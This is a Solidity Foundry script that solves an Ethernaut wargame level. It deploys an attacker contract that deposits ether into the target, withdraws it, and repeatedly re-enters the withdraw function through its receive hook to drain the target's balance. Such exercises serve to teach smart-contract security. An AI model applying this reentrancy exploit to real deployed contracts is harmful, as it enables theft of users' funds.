// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {EthernautL11} from "../src/EthernautL11.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackContract {
    EthernautL11 public ethernautL11 =
        EthernautL11(payable(0x7DBb58EF52f1852b58c6fD0E20F4E4c9F33538A6));
    constructor() public payable {
        // Call the deposit function
        ethernautL11.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() public {
        // Call the withdraw function
        ethernautL11.withdraw(0.001 ether);
        (bool result, ) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        ethernautL11.withdraw(msg.value);
    }
}

contract EthernautL11Script is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        FallbackContract fallbackContract = new FallbackContract{
            value: 0.001 ether
        }();
        fallbackContract.withdraw();
        vm.stopBroadcast();
    }
}
